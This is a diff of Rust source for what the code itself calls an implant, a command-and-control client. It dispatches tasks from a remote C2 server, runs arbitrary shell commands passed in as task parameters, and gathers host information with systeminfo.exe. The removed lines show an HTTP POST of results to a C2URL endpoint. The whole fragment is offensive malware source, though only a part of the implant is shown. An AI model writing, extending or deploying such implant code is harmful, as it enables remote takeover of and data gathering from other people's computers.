@@ -67,11 +67,9 @@ async fn handle_body(body: String) {
                 }
                 c2_actions::ShellCommand => {
                     exec_shell_command(c2_response.task_parameters).await;
-                    println!("Successfully registered implant");
                 }
                 c2_actions::SystemInfo => {
-                    exec_shell_command("systeminfo.exe".to_string()).await;
-                    //send_sys_info().await;
+                    send_sys_info().await;
                 }
                 _ => {
                     println!("Unknown action type");
@@ -86,17 +84,7 @@ async fn handle_body(body: String) {
 }
 
 async fn send_sys_info() {
-    let client = reqwest::Client::new();
-    let body = serde_json::to_string(&PostRequest::new(
-        SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(),
-        c2_actions::SystemInfo,
-        "".to_string(),
-        "Not yet implemented".as_bytes().to_vec()
-    )).unwrap();
-    client.post(format!("{}/{}", C2URL, C2ID).as_str())
-        .body(body)
-        .send().await.unwrap();
-    println!("Sending system info");
+    exec_shell_command("systeminfo.exe".to_string()).await;
 }
 async fn send_file(target_file: String) {
     println!("TODO");
